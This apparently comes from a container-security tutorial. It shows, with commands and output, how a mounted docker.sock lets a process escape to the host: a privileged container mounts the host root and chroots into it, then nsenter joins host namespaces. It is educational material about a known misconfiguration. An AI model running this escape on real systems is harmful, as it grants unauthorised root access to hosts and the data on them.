# Docker-sock

When we run docker CLI using `docker` we are basically talking with a docker daemon which runs as privileged
(because we need to be a root to create a new namespace) on the host. This is done using the `docker.sock`
which is usually located at `/var/run/docker.sock`.

There is a common practice called DIND (Docker inside Docker), which was mostly used for CI process to allow us to build
docker images. This was needed because as we could see in previous chapters we need a container to build a Docker image.
And container/runner on CI is a container itself, so the best way was to mount docker.sock from host inside spawned container.

This pattern can also be seen all over the Github.

Lets see/abuse it in practice:

1. To use DIND we just need to mount docker.sock inside container.

```bash
root@ubuntu-s-1vcpu-2gb-fra1-01:/# docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock alpine
/ #
```

Notice that I didn't add any privileges.

2. Now that docker.sock is mounted inside container we need to communicate with it.

We could use API calls directly but because we are lazy we can install `docker-cli`

```bash
/ # apk update
fetch https://dl-cdn.alpinelinux.org/alpine/v3.19/main/x86_64/APKINDEX.tar.gz
fetch https://dl-cdn.alpinelinux.org/alpine/v3.19/community/x86_64/APKINDEX.tar.gz
v3.19.1-358-g8df340e3e71 [https://dl-cdn.alpinelinux.org/alpine/v3.19/main]
v3.19.1-357-g74cc9556025 [https://dl-cdn.alpinelinux.org/alpine/v3.19/community]
OK: 22991 distinct packages available
/ # apk add docker-cli
(1/2) Installing ca-certificates (20240226-r0)
(2/2) Installing docker-cli (25.0.3-r2)
Executing busybox-1.36.1-r15.trigger
Executing ca-certificates-20240226-r0.trigger
OK: 33 MiB in 17 packages
```

3. Use docker CLI to talk with daemon.

```bash
/ # docker ps
CONTAINER ID   IMAGE     COMMAND     CREATED              STATUS              PORTS     NAMES
0beee052b2be   alpine    "/bin/sh"   About a minute ago   Up About a minute             pensive_margulis
```

Basically we see the container we are in inside our container (inception) because remember daemon is still
running on the host.

4. Escape the container

```sh
docker run -it --rm --security-opt=apparmor:unconfined -v /:/tmp/root --privileged --pid=host alpine chroot /tmp/root sh
```

Lets break it down:

- `--security-opt=apparmor:unconfined`: When Docker runs containers it also applies some basic AppArmor (MAC) profile.
  Becase we don't want restrictions we can just remove it (on K8s there is no default apparmor enabled by default).
- `-v /:/tmp/root`: We want to mount `/` to `/tmp/root` inside container. But because daemon runs on host this will
  mount host root on `/tmp/root` inside container.
- `--privileged`: Because we don't want to be restricted by missing capabilities.
- `--pid=host`: I don't want Docker to isolate process ID namespace. So I can see all the processes that are running on host
- `chroot /tmp/root sh`: When container spawns I want to change root on the host root and give myself shell.

5. Inspect results

Inside "container":

```bash
touch /tmp/from-container
```

On host:

```bash
root@ubuntu-s-1vcpu-2gb-fra1-01:~# ls /tmp/ | grep container
from-container
```

We see we have access to host filesystem.

This could be done without --privileged, --pid=host, --security-opt flags as well.
What I wanted to point out is that currently there are still things isolated.

Example:

```bash
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.3/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

We are still in isolated network namespaces (and others)..

But with those flags I can just enter all of the host namespaces.

```bash
# nsenter --target 1 --net sh
```

This indicates to join same network namespace that PID with 1 is. Because 1 is the root process when OS starts
we will join host net namespace.

```bash
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 12:c8:da:c0:c4:70 brd ff:ff:ff:ff:ff:ff
    altname enp0s3
    altname ens3
    inet 165.232.68.145/20 brd 165.232.79.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet 10.19.0.5/16 brd 10.19.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::10c8:daff:fec0:c470/64 scope link
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 2e:b2:d1:d3:9f:e9 brd ff:ff:ff:ff:ff:ff
    altname enp0s4
    altname ens4
    inet 10.135.0.2/16 brd 10.135.255.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::2cb2:d1ff:fed3:9fe9/64 scope link
       valid_lft forever preferred_lft forever
4: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:79:f7:c5:51 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
...
```
